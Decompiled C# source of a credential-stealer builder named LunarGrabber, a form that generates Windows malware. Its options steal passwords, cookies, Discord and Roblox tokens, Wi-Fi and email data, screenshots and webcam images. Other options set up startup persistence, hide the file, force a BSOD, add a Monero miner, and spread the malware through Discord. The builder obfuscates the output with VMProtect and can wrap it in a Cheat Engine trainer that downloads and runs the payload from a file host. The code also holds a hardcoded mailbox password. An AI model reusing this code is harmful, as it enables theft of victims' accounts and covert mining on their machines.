using System;
using System.CodeDom.Compiler;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AnonFileAPI;
using Asteroid.Properties;
using Discord;
using dnlib.DotNet;
using MailKit;
using MailKit.Net.Smtp;
using MailKit.Security;
using MetroFramework;
using MetroFramework.Components;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Microsoft.CSharp;
using MimeKit;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Suite;
using Zeroit.Framework.CodeTextBox;

namespace LunarGrabber
{
	public class MainForm : MetroForm
	{
		private static string authusername;

		private Random random = new Random();

		private IContainer components;

		private TabPage tabPage1;

		private TabPage tabPage2;

		private MetroTabControl mainTabControl;

		private MetroTabPage builderTab;

		private MetroCheckBox hideGrabberCheckBox;

		private MetroCheckBox passwordsCheckBox;

		private MetroCheckBox screenshotCheckBox;

		private MetroCheckBox webcamCheckBox;

		private MetroCheckBox cetrainerCheckBox;

		private MetroTextBox errorMessageTextBox;

		private MetroTextBox errorTitleTextBox;

		private MetroCheckBox startupCheckBox;

		private MetroCheckBox bsodCheckBox;

		private MetroCheckBox discordCheckBox;

		private MetroCheckBox fakeErrorCheckBox;

		private MetroTabControl metroTabControl2;

		private MetroTabPage optionsTab;

		private MetroTabPage extraTab;

		private MetroTabPage compilerTab;

		private MetroTextBox compilerOutputTextBox;

		private MetroStyleManager styleManager;

		private MetroCheckBox embedColorCheckBox;

		private PictureBox embedColorPictureBox;

		private PictureBox iconPictureBox;

		private MetroCheckBox iconCheckBox;

		private MetroTextBox iconPathTextBox;

		private MetroTextBox pumpAmountTextBox;

		private MetroCheckBox byteCheckBox;

		private MetroCheckBox kiloByteCheckBox;

		private MetroCheckBox filePumperCheckBox;

		private MetroCheckBox megaByteCheckBox;

		private MetroCheckBox robloxCheckBox;

		private MetroCheckBox cookiesCheckBox;

		private MetroCheckBox disableInputCheckBox;

		private MetroCheckBox autoSpreadCheckBox;

		private MetroTextBox spreadMessage;

		private MetroPanel comingSoonPanel3;

		private MetroPanel comingSoonPanel2;

		private MetroTextBox webhookTextBox;

		private MetroLabel comingSoonLabel3;

		private MetroLabel comingSoonLabel2;

		private MetroButton testWebhookButton;

		private MetroButton compileButton;

		private MetroButton chooseIconButton;

		private GroupBox webhookGroupBox;

		private MetroTabPage settingsTab;

		private MetroLabel expiryLabel;

		private MetroLabel userLabel;

		private MetroComboBox stylesComboBox;

		private MetroTextBox txtPasswords;

		private MetroTextBox txtCookies;

		private MetroCheckBox copyToTempCheckBox;

		private MetroTextBox poolTextBox;

		private MetroTextBox walletTextBox;

		private MetroCheckBox moneroMinerCheckBox;

		private MetroToolTip metroToolTip;

		private MetroTabPage otherTab;

		private GroupBox loginGroupBox;

		private MetroTabPage pluginsTab;

		private ZeroitCodeTextBox pluginTextBox;

		private GroupBox groupBox1;

		private GroupBox userInfoGroupBox;

		private MetroTrackBar opacityTrackBar;

		private MetroTextBox loginTokenTextBox;

		private MetroButton loginButton;

		private MetroLabel phoneLabel;

		private MetroLabel emailLabel;

		private MetroLabel usernameLabel;

		private SiticoneMetroTrackBar blueTrackBar;

		private SiticoneMetroTrackBar greenTrackBar;

		private SiticoneMetroTrackBar redTrackBar;

		private MetroTabPage binderTab;

		private MetroButton removeButton;

		private ListView filesListView;

		private ColumnHeader fileNameHeader;

		private ColumnHeader fileSizeHeader;

		private MetroButton addButton;

		private GroupBox comingSoonGroupBox;

		private MetroCheckBox emailCheckBox1;

		private MetroCheckBox wifiCheckBox1;

		private MetroTextBox webhookIDbox;

		public MainForm()
			: this()
		{
			InitializeComponent();
		}

		private void MainForm_Load(object sender, EventArgs e)
		{
			//IL_01e6: Unknown result type (might be due to invalid IL or missing references)
			//IL_01ec: Unknown result type (might be due to invalid IL or missing references)
			//IL_01f2: Expected I4, but got Unknown
			//IL_01ff: Unknown result type (might be due to invalid IL or missing references)
			Control.CheckForIllegalCrossThreadCalls = false;
			((Control)(object)userLabel).Text = "User: " + User.Username;
			authusername = User.Username;
			((Control)(object)expiryLabel).Text = "Expiry: " + User.Expiry;
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			if (Program.GetValue("Red") != null && Program.GetValue("Green") != null && Program.GetValue("Blue") != null)
			{
				((SiticoneTrackBar)redTrackBar).set_Value(int.Parse(Program.GetValue("Red")));
				((SiticoneTrackBar)greenTrackBar).set_Value(int.Parse(Program.GetValue("Green")));
				((SiticoneTrackBar)blueTrackBar).set_Value(int.Parse(Program.GetValue("Blue")));
				embedColorPictureBox.BackColor = Color.FromArgb(((SiticoneTrackBar)redTrackBar).get_Value(), ((SiticoneTrackBar)greenTrackBar).get_Value(), ((SiticoneTrackBar)blueTrackBar).get_Value());
			}
			else
			{
				embedColorPictureBox.BackColor = Color.FromArgb(((SiticoneTrackBar)redTrackBar).get_Value(), ((SiticoneTrackBar)greenTrackBar).get_Value(), ((SiticoneTrackBar)blueTrackBar).get_Value());
			}
			foreach (object value in Enum.GetValues(typeof(MetroColorStyle)))
			{
				if (value.ToString() != "Default")
				{
					((ComboBox)(object)stylesComboBox).Items.Add(value.ToString());
				}
			}
			if (Program.GetValue("Color") != null)
			{
				((ListControl)(object)stylesComboBox).SelectedIndex = Convert.ToInt32(Program.GetValue("Color"));
				components.SetStyle((MetroForm)(object)this, (MetroColorStyle)(Convert.ToInt32(Program.GetValue("Color")) + 1));
			}
			else
			{
				((ListControl)(object)stylesComboBox).SelectedIndex = styleManager.get_Style() - 1;
				components.SetStyle((MetroForm)(object)this, styleManager.get_Style());
			}
			if (Program.GetValue("Opacity") != null)
			{
				opacityTrackBar.set_Value(Convert.ToInt32(Program.GetValue("Opacity")));
			}
			else
			{
				opacityTrackBar.set_Value(100);
			}
			if (Program.GetValue("Webhook") != null)
			{
				((Control)(object)webhookTextBox).Text = Program.GetValue("Webhook");
			}
			if (Program.GetValue("WebhookID") != null)
			{
				((Control)(object)webhookIDbox).Text = Program.GetValue("WebhookID");
			}
		}

		private string ColorToHex(Color color)
		{
			return int.Parse(color.R.ToString("X2") + color.G.ToString("X2") + color.B.ToString("X2"), NumberStyles.HexNumber).ToString();
		}

		private string Options(string code)
		{
			code = code.Replace("webhookUrl", ((Control)(object)webhookTextBox).Text);
			code = code.Replace("WebhookID", ((Control)(object)webhookIDbox).Text);
			code = code.Replace("hexColor", ColorToHex(embedColorPictureBox.BackColor));
			code = code.Replace("falsePasswords", ((CheckBox)(object)passwordsCheckBox).Checked.ToString());
			code = code.Replace("falseCookies", ((CheckBox)(object)cookiesCheckBox).Checked.ToString());
			code = code.Replace("falseScreenshot", ((CheckBox)(object)screenshotCheckBox).Checked.ToString());
			code = code.Replace("falseWebcam", ((CheckBox)(object)webcamCheckBox).Checked.ToString());
			code = code.Replace("falseRoblox", ((CheckBox)(object)robloxCheckBox).Checked.ToString());
			code = code.Replace("falseEmail", ((CheckBox)(object)emailCheckBox1).Checked.ToString());
			code = code.Replace("falseWifi", ((CheckBox)(object)wifiCheckBox1).Checked.ToString());
			code = code.Replace("falseDiscord", ((CheckBox)(object)discordCheckBox).Checked.ToString());
			code = code.Replace("generatedBy", authusername);
			if (((CheckBox)(object)fakeErrorCheckBox).Checked)
			{
				code = code.Replace("//fakeError", "MessageBox.Show(\"" + ((Control)(object)errorMessageTextBox).Text + "\", \"" + ((Control)(object)errorTitleTextBox).Text + "\", MessageBoxButtons.OK, MessageBoxIcon.Error);");
			}
			if (((CheckBox)(object)bsodCheckBox).Checked)
			{
				code = code.Replace("//bsod", "BSOD();");
			}
			if (((CheckBox)(object)startupCheckBox).Checked)
			{
				code = code.Replace("//startup", "AddToStartup(Assembly.GetExecutingAssembly().Location);");
			}
			if (((CheckBox)(object)hideGrabberCheckBox).Checked)
			{
				code = code.Replace("//hideGrabber", "File.SetAttributes(Assembly.GetExecutingAssembly().Location, File.GetAttributes(Assembly.GetExecutingAssembly().Location) | FileAttributes.Hidden);");
			}
			if (((CheckBox)(object)discordCheckBox).Checked)
			{
				code = code.Replace("//tracer", "\r\n                foreach (var dir in directories)\r\n                {                \r\n                    var tracer = new Tracer();\r\n                    tracer.StartTracing(dir);\r\n                }");
			}
			if (((CheckBox)(object)disableInputCheckBox).Checked)
			{
				code = code.Replace("//disableInput", "DisableInput();");
			}
			if (((CheckBox)(object)autoSpreadCheckBox).Checked)
			{
				code = code.Replace("spreadMessage", ((Control)(object)spreadMessage).Text);
				code = code.Replace("//autoSpread", "AutoSpread();");
			}
			if (((CheckBox)(object)copyToTempCheckBox).Checked)
			{
				code = code.Replace("//copyToTemp", "CopyToTemp();");
			}
			if (((CheckBox)(object)moneroMinerCheckBox).Checked)
			{
				code = code.Replace("//moneroMiner", "MoneroMiner();");
				code = code.Replace("pool", ((Control)(object)poolTextBox).Text);
				code = code.Replace("wallet", ((Control)(object)walletTextBox).Text);
			}
			if (!string.IsNullOrEmpty(((Control)(object)pluginTextBox).Text) && !string.IsNullOrWhiteSpace(((Control)(object)pluginTextBox).Text))
			{
				code = code.Replace("//pluginCode", ((Control)(object)pluginTextBox).Text);
				code = code.Replace("//plugin", "Plugin();");
			}
			return code;
		}

		private void Compiler(string code, string path)
		{
			//IL_0703: Unknown result type (might be due to invalid IL or missing references)
			//IL_070a: Expected O, but got Unknown
			((Control)(object)compilerOutputTextBox).Text = "[Compiler]> Started compiling..." + Environment.NewLine;
			string text = RandomString();
			string text2 = Path.Combine(Path.GetTempPath(), text);
			Directory.CreateDirectory(text2);
			File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
			try
			{
				string text3 = text + ".resources";
				if (filesListView.Items.Count > 0)
				{
					compilerOutputTextBox.AppendText("[Compiler]> Binding files..." + Environment.NewLine);
					using ResourceWriter resourceWriter = new ResourceWriter(text3);
					string text4 = string.Empty;
					foreach (ListViewItem item in filesListView.Items)
					{
						string text5 = RandomString();
						resourceWriter.AddResource(text5, File.ReadAllBytes(item.SubItems[0].Text));
						string runBindedFile = Resources.RunBindedFile;
						runBindedFile = runBindedFile.Replace("resourcenamenoextension", text5);
						runBindedFile = runBindedFile.Replace("resourcename", text5 + Path.GetExtension(Path.GetExtension(item.SubItems[0].Text)));
						text4 += runBindedFile;
					}
					code = code.Replace("//runfilescode", text4);
					code = code.Replace("resourcesfilename", text);
				}
				string text6 = text2 + "\\" + text + ".exe";
				CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
				CompilerParameters compilerParameters = new CompilerParameters();
				compilerOutputTextBox.AppendText("[Compiler]> Adding references..." + Environment.NewLine);
				compilerParameters.GenerateExecutable = true;
				compilerParameters.OutputAssembly = text6;
				compilerParameters.TreatWarningsAsErrors = false;
				string[] array = new string[19]
				{
					"Anarchy.dll", "System.Net.dll", "System.Web.dll", "System.IO.Compression.FileSystem.dll", "AForge.dll", "AForge.Video.dll", "AForge.Video.DirectShow.dll", "System.dll", "Leaf.xNet.dll", "Newtonsoft.Json.dll",
					"System.Windows.Forms.dll", "System.Web.Extensions.dll", "System.Net.Http.dll", "System.Drawing.dll", "System.Linq.dll", "System.Core.dll", "System.Xml.dll", "System.Management.dll", "websocket-sharp.dll"
				};
				string[] array2 = array;
				foreach (string value in array2)
				{
					compilerParameters.ReferencedAssemblies.Add(value);
				}
				if (File.Exists(text3))
				{
					compilerParameters.EmbeddedResources.Add(text3);
				}
				compilerParameters.CompilerOptions = "/t:winexe /optimize /unsafe /platform:x86";
				if (((CheckBox)(object)iconCheckBox).Checked)
				{
					if (!string.IsNullOrEmpty(((Control)(object)iconPathTextBox).Text) && !string.IsNullOrWhiteSpace(((Control)(object)iconPathTextBox).Text))
					{
						compilerParameters.CompilerOptions = compilerParameters.CompilerOptions + " /win32icon:\"" + ((Control)(object)iconPathTextBox).Text + "\"";
					}
					else
					{
						compilerOutputTextBox.AppendText("[Compiler]> The custom icon path can't be empty");
					}
				}
				CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, code);
				cSharpCodeProvider.Dispose();
				File.Delete(text3);
				if (compilerResults.Errors.Count > 0)
				{
					foreach (CompilerError error in compilerResults.Errors)
					{
						compilerOutputTextBox.AppendText($"[Compiler]> {error.ErrorText}, Line: {error.Line}{Environment.NewLine}");
					}
					return;
				}
				compilerOutputTextBox.AppendText("[Compiler]> Embedding dlls..." + Environment.NewLine);
				ModuleDefMD val = ModuleDefMD.Load(text6, (ModuleCreationOptions)null);
				foreach (AssemblyRef assemblyRef in ((ModuleDef)val).GetAssemblyRefs())
				{
					if (File.Exists($"{assemblyRef.get_Name()}.dll"))
					{
						File.Copy($"{assemblyRef.get_Name()}.dll", $"{Path.GetDirectoryName(text6)}\\{assemblyRef.get_Name()}.dll");
					}
				}
				File.Copy("Leaf.xNet.dll", Path.GetDirectoryName(text6) + "\\Leaf.xNet.dll");
				File.Copy("websocket-sharp.dll", Path.GetDirectoryName(text6) + "\\websocket-sharp.dll");
				((ModuleDef)val).Dispose();
				string text7 = text2 + "\\" + Path.GetFileNameWithoutExtension(text6) + ".Embedded.exe";
				using (Process process = new Process())
				{
					process.StartInfo.WorkingDirectory = "Resources";
					process.StartInfo.FileName = "cmd.exe";
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.StartInfo.Arguments = "/C UltraEmbeddable " + text6 + " " + text7;
					process.Start();
					process.WaitForExit();
				}
				compilerOutputTextBox.AppendText("[Compiler]> Obfuscating..." + Environment.NewLine);
				string text8 = text2 + "\\GrabberProject.vmp";
				File.WriteAllBytes(text8, Resources.GrabberProject);
				using (Process process2 = new Process())
				{
					process2.StartInfo.WorkingDirectory = "Resources";
					process2.StartInfo.FileName = "cmd.exe";
					process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process2.StartInfo.Arguments = "/C VMProtect_Con " + text7 + " \"" + path + "\" -pf " + text8;
					process2.Start();
					process2.WaitForExit();
				}
				File.Delete(text8);
				if (!((CheckBox)(object)filePumperCheckBox).Checked)
				{
					goto IL_06f6;
				}
				compilerOutputTextBox.AppendText("[Compiler]> Pumping the grabber..." + Environment.NewLine);
				if (int.TryParse(((Control)(object)pumpAmountTextBox).Text, out var result))
				{
					FileStream fileStream = File.OpenWrite(path);
					long num = fileStream.Seek(0L, SeekOrigin.End);
					long num2 = Convert.ToInt64(result);
					decimal num3 = default(decimal);
					if (((CheckBox)(object)byteCheckBox).Checked)
					{
						num3 = num + num2 * 2;
					}
					else if (((CheckBox)(object)kiloByteCheckBox).Checked)
					{
						num3 = num + num2 * 1024;
					}
					else if (((CheckBox)(object)megaByteCheckBox).Checked)
					{
						num3 = num + num2 * 1048576;
					}
					while ((decimal)num < num3)
					{
						num++;
						fileStream.WriteByte(0);
					}
					fileStream.Close();
					goto IL_06f6;
				}
				compilerOutputTextBox.AppendText("[Compiler]> Your file pump amount is invalid!");
				goto end_IL_003b;
				IL_06f6:
				if (((CheckBox)(object)cetrainerCheckBox).Checked)
				{
					AnonFileWrapper val2 = new AnonFileWrapper();
					AnonFile val3 = val2.UploadFile(path);
					string directDownloadLinkFromLink = val2.GetDirectDownloadLinkFromLink(val3.get_FullUrl(), "download-url");
					string text9 = "local int = getInternet() local url = '" + directDownloadLinkFromLink + "' local download_file = int.getURL(url) local dir = os.getenv('USERPROFILE') .. '\\\\AppData\\\\Roaming\\\\' local file_name = dir .. '" + Path.GetFileNameWithoutExtension(path) + ".exe' local file = io.open(file_name, 'wb') file:write(download_file) file:close() int.destroy() shellExecute(file_name)";
					File.WriteAllText(path, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<CheatTable CheatEngineTableVersion=\"34\">\n<CheatEntries/>\n<UserdefinedSymbols/>\n<LuaScript>\n\n" + text9 + "\n\n</LuaScript>\n</CheatTable>");
				}
				compilerOutputTextBox.AppendText("[Compiler]> Grabber saved at: " + path + "!");
				end_IL_003b:;
			}
			catch (Exception ex)
			{
				if (Directory.Exists(text2))
				{
					Directory.Delete(text2, recursive: true);
				}
				compilerOutputTextBox.AppendText("[Compiler]> " + ex.Message);
			}
		}

		public static byte[] Compress(byte[] data)
		{
			MemoryStream memoryStream = new MemoryStream();
			using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionLevel.Optimal))
			{
				deflateStream.Write(data, 0, data.Length);
			}
			return memoryStream.ToArray();
		}

		private string RandomString()
		{
			return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890", 8)
				select s[random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890".Length)]).ToArray());
		}

		private void compileButton_Click(object sender, EventArgs e)
		{
			Program.SetValue("Red", ((SiticoneTrackBar)redTrackBar).get_Value().ToString());
			Program.SetValue("Green", ((SiticoneTrackBar)greenTrackBar).get_Value().ToString());
			Program.SetValue("Blue", ((SiticoneTrackBar)blueTrackBar).get_Value().ToString());
			Program.SetValue("Webhook", ((Control)(object)webhookTextBox).Text);
			Program.SetValue("WebhookID", ((Control)(object)webhookIDbox).Text);
			string code = Options(Resources.Code);
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			if (!((CheckBox)(object)cetrainerCheckBox).Checked)
			{
				saveFileDialog.FileName = "Grabber.exe";
				saveFileDialog.Filter = "Exe Files (.exe)|*.exe";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					Compiler(code, saveFileDialog.FileName);
				}
			}
			else
			{
				saveFileDialog.FileName = "Grabber.CETRAINER";
				saveFileDialog.Filter = "Cetrainer Files (.CETRAINER)|*.CETRAINER";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					Compiler(code, saveFileDialog.FileName);
				}
			}
		}

		private void chooseIconButton_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "Ico Files (.ico)|*.ico";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				((Control)(object)iconPathTextBox).Text = openFileDialog.FileName;
				iconPictureBox.Image = Image.FromFile(((Control)(object)iconPathTextBox).Text);
			}
		}

		private string Decrypt(string cipherText)
		{
			byte[] array = Convert.FromBase64String(cipherText);
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Key = Encoding.UTF8.GetBytes("VWmehqdrF6nzsmhHVaowiu6bqEV6X6dm");
			rijndaelManaged.IV = Encoding.UTF8.GetBytes("jkhdtTnMzI8bcYsC");
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			using ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV);
			return Encoding.Unicode.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}

		private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			Environment.Exit(1);
		}

		private void iconCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			((Control)(object)iconPathTextBox).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
			((Control)(object)chooseIconButton).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
			iconPictureBox.Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
		}

		private void filePumperCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			((Control)(object)pumpAmountTextBox).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
			((Control)(object)byteCheckBox).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
			((Control)(object)kiloByteCheckBox).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
			((Control)(object)megaByteCheckBox).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
		}

		private void fakeErrorCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			((Control)(object)errorTitleTextBox).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
			((Control)(object)errorMessageTextBox).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
		}

		private void embedColorCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			embedColorPictureBox.Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
			((Control)(object)redTrackBar).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
			((Control)(object)greenTrackBar).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
			((Control)(object)blueTrackBar).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
		}

		private void autoSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			((Control)(object)spreadMessage).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
		}

		private void testWebhookButton_Click(object sender, EventArgs e)
		{
			//IL_0028: Unknown result type (might be due to invalid IL or missing references)
			//IL_002e: Expected O, but got Unknown
			//IL_003a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0044: Expected O, but got Unknown
			//IL_0050: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Expected O, but got Unknown
			//IL_006b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0070: Unknown result type (might be due to invalid IL or missing references)
			//IL_0080: Expected O, but got Unknown
			//IL_0080: Unknown result type (might be due to invalid IL or missing references)
			//IL_0087: Expected O, but got Unknown
			if (((CheckBox)(object)emailCheckBox1).Checked)
			{
				string text = ((Control)(object)webhookTextBox).Text;
				string text2 = "claimAsteroidLLC@gmail.com";
				string text3 = "claimAsteroidLLCclaimAsteroidLLC";
				MimeMessage val = new MimeMessage();
				val.get_From().Add((InternetAddress)new MailboxAddress("Asteroid LLC", text2));
				val.get_To().Add((InternetAddress)new MailboxAddress("", text));
				val.set_Subject("Asteroid LLC - SUBJECT");
				TextPart val2 = new TextPart("plain");
				val2.set_Text("Asteroid LLC - BODY");
				val.set_Body((MimeEntity)val2);
				try
				{
					SmtpClient val3 = new SmtpClient();
					try
					{
						((MailService)val3).Connect("smtp.gmail.com", 587, (SecureSocketOptions)1, default(CancellationToken));
						((MailService)val3).get_AuthenticationMechanisms().Remove("XOAUTH2");
						((MailService)val3).Authenticate(text2, text3, default(CancellationToken));
						((MailTransport)val3).Send(val, default(CancellationToken), (ITransferProgress)null);
						((MailService)val3).Disconnect(true, default(CancellationToken));
						MessageBox.Show("Email was successfully delivered to: " + text);
					}
					finally
					{
						((IDisposable)val3)?.Dispose();
					}
				}
				catch (IOException ex)
				{
					MessageBox.Show("An exception occoured while delivering the email to: " + text);
					MessageBox.Show(ex.ToString());
				}
			}
			else
			{
				try
				{
					string text4 = "https://discord.com/api/webhooks/id/text";
					string text5 = text4.Replace("id", ((Control)(object)webhookIDbox).Text);
					string address = text5.Replace("text", ((Control)(object)webhookTextBox).Text);
					new WebClient().UploadValues(address, new NameValueCollection
					{
						{ "content", "Webhook is available!" },
						{ "username", "Asteroid LLC" }
					});
				}
				catch (Exception ex2)
				{
					MessageBox.Show(ex2.ToString());
				}
			}
		}

		private void colorsComboBox_SelectedIndexChanged(object sender, EventArgs e)
		{
			Program.SetValue("Color", ((ListControl)(object)stylesComboBox).SelectedIndex.ToString());
			components.SetStyle((MetroForm)(object)this, (MetroColorStyle)(Convert.ToInt32(Program.GetValue("Color")) + 1));
		}

		private void bitcoinMinerCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			((Control)(object)poolTextBox).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
			((Control)(object)walletTextBox).Enabled = ((CheckBox)(sender as MetroCheckBox)).Checked;
		}

		private void opacityTrackBar_ValueChanged(object sender, EventArgs e)
		{
			((Form)this).Opacity = (double)(sender as MetroTrackBar).get_Value() / 100.0;
			Program.SetValue("Opacity", (sender as MetroTrackBar).get_Value().ToString());
		}

		private void loginButton_Click(object sender, EventArgs e)
		{
			if (!ValidToken(((Control)(object)loginTokenTextBox).Text))
			{
				MessageBox.Show("You can't login with a invalid token!", OnProgramStart.Name, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void loginTokenTextBox_TextChanged(object sender, EventArgs e)
		{
			if (ValidToken(((Control)(object)loginTokenTextBox).Text))
			{
				DiscordClient discordClient = new DiscordClient(((Control)(object)loginTokenTextBox).Text, new DiscordConfig
				{
					RetryOnRateLimit = true
				});
				((Control)(object)usernameLabel).Text = $"User: {discordClient.User.Username}#{discordClient.User.Discriminator}";
				((Control)(object)emailLabel).Text = string.Format("Email: {0}", discordClient.User.Email ?? "Not found");
				((Control)(object)phoneLabel).Text = string.Format("Phone: {0}", discordClient.User.PhoneNumber ?? "Not found");
			}
			else
			{
				((Control)(object)usernameLabel).Text = "User: Invalid Token";
				((Control)(object)emailLabel).Text = "Email: Invalid Token";
				((Control)(object)phoneLabel).Text = "Phone: Invalid Token";
			}
		}

		private bool ValidToken(string token)
		{
			try
			{
				DiscordClient discordClient = new DiscordClient(token, new DiscordConfig
				{
					RetryOnRateLimit = true
				});
				return true;
			}
			catch
			{
				return false;
			}
		}

		private void redTrackBar_ValueChanged(object sender, EventArgs e)
		{
			embedColorPictureBox.BackColor = Color.FromArgb(((SiticoneTrackBar)redTrackBar).get_Value(), ((SiticoneTrackBar)greenTrackBar).get_Value(), ((SiticoneTrackBar)blueTrackBar).get_Value());
		}

		private void greenTrackBar_ValueChanged(object sender, EventArgs e)
		{
			embedColorPictureBox.BackColor = Color.FromArgb(((SiticoneTrackBar)redTrackBar).get_Value(), ((SiticoneTrackBar)greenTrackBar).get_Value(), ((SiticoneTrackBar)blueTrackBar).get_Value());
		}

		private void blueTrackBar_ValueChanged(object sender, EventArgs e)
		{
			embedColorPictureBox.BackColor = Color.FromArgb(((SiticoneTrackBar)redTrackBar).get_Value(), ((SiticoneTrackBar)greenTrackBar).get_Value(), ((SiticoneTrackBar)blueTrackBar).get_Value());
		}

		private void addButton_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "All files (*.*)|*.*";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				filesListView.Items.Add(new ListViewItem(new string[2]
				{
					openFileDialog.FileName,
					$"{new FileInfo(openFileDialog.FileName).Length / 1024} KB"
				}));
			}
		}

		private void removeButton_Click(object sender, EventArgs e)
		{
			if (filesListView.SelectedItems.Count > 0)
			{
				filesListView.Items.Remove(filesListView.SelectedItems[0]);
			}
		}

		private void webhookGroupBox_Enter(object sender, EventArgs e)
		{
		}

		private void passwordsCheckBox_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void optionsTab_Click(object sender, EventArgs e)
		{
		}

		private void emailCheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (((CheckBox)(object)emailCheckBox1).Checked)
			{
				webhookGroupBox.Text = "Email";
				webhookTextBox.set_PromptText("Email Address");
				((Control)(object)testWebhookButton).Text = "Test Email";
			}
			if (!((CheckBox)(object)emailCheckBox1).Checked)
			{
				webhookGroupBox.Text = "Webhook";
				webhookTextBox.set_PromptText("Webhook URL");
				((Control)(object)testWebhookButton).Text = "Test Webhook";
			}
		}

		private void webhookTextBox_Click(object sender, EventArgs e)
		{
		}

		private void wifiCheckBox1_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void webhookIDbox_Click(object sender, EventArgs e)
		{
		}

		private void userLabel_Click(object sender, EventArgs e)
		{
		}

		private void builderTab_Click(object sender, EventArgs e)
		{
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			((MetroForm)this).Dispose(disposing);
		}

		private void InitializeComponent()
		{
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Expected O, but got Unknown
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_005d: Expected O, but got Unknown
			//IL_005e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0068: Expected O, but got Unknown
			//IL_0069: Unknown result type (might be due to invalid IL or missing references)
			//IL_0073: Expected O, but got Unknown
			//IL_0074: Unknown result type (might be due to invalid IL or missing references)
			//IL_007e: Expected O, but got Unknown
			//IL_007f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0089: Expected O, but got Unknown
			//IL_008a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0094: Expected O, but got Unknown
			//IL_0095: Unknown result type (might be due to invalid IL or missing references)
			//IL_009f: Expected O, but got Unknown
			//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
			//IL_00aa: Expected O, but got Unknown
			//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b5: Expected O, but got Unknown
			//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c0: Expected O, but got Unknown
			//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
			//IL_00cb: Expected O, but got Unknown
			//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d6: Expected O, but got Unknown
			//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e1: Expected O, but got Unknown
			//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ec: Expected O, but got Unknown
			//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f7: Expected O, but got Unknown
			//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
			//IL_0102: Expected O, but got Unknown
			//IL_0103: Unknown result type (might be due to invalid IL or missing references)
			//IL_010d: Expected O, but got Unknown
			//IL_010e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0118: Expected O, but got Unknown
